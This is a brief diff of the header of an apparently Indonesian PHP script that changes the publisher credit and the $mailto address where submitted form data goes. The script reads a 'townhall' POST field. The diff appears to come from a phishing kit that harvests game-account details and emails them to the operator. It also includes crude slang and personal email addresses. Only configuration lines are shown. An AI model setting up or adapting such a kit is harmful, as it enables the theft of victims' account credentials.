@@ -2,12 +2,12 @@
 ###################################################
 ##        Author : Andi Yusran                	 ##
 ## 		Shared By : Mustakin Nur				 ##
-##  Publisher: www.blog-takin.com                ##
+##  Publisher: www.T-faces.github.com                ##
 ###################################################
 /* DUA TIGA TUTUP BOTOL. 
  JANGAN GANTI COPYRIGHT KONTOL wkwkwkwk */
 
-$mailto = 'emailmuuhuinfo@gmail.com'; //masukin email lo disini
+$mailto = 'ariagungsatria01@gmail.com'; //masukin email lo disini
 
 
 $townhall = $_POST['townhall'];
